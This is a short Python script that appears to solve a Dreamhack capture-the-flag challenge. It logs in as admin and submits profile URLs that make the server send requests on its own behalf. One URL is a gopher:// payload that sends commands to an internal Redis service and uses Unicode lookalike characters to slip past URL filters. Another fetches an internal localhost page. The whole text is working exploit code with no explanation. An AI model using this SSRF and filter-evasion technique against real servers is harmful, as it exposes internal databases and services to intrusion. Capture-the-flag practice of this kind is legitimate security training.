import requests

url = "http://host1.dreamhack.games:10004"

s = requests.Session()
s.post(url + "/login", json={"username": "admin", "password": "admin", "email":"admin"})
r = s.post(url + "/add", json={"key":["profile"], "value": {"url":"gopher://redis︓6379／_keys％20﹡％0d％0aquit％0d％0a127.0.0.1:8000","isRender":"true"}})
print(r.text)
r = s.get(url + "/")
print(r.text)
r = s.post(url + "/add", json={"key":["profile"], "value": {"url":"http://127.0.0.1:8000/view/bc0a020d74183e18116b77e46d1e1bcb724df910511c630bfbe350f321bd8b25079bb6bfeed007d50e99834d19a08e37eba2788dfa3d1b3d3c249297b0add8bb","isRender":"true"}})
print(r.text)
r = s.get(url + "/")
print(r.text)